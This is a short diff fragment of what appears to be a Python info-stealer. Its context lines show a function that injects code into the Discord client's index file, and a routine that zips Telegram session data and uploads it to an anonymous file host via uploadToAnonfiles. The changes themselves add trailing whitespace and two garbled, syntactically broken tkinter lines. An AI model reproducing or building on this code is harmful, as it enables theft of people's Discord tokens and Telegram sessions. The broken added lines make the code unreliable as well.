@@ -271,7 +271,7 @@ def inj_discord():
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj_content)
-inj_discord()
+inj_discord()                                
 
 def G3tB4dg31(flags):
     if flags == 0: return ''
@@ -729,6 +729,8 @@ def ZipTelegram(path, arg, procc):
     for file in os.listdir(pathC):
         if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
             zf.write(pathC + "/" + file)
+                 tkinter.Label(root, text = print("press enter to start"0
+                 font = ('Helvetica', 12)
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
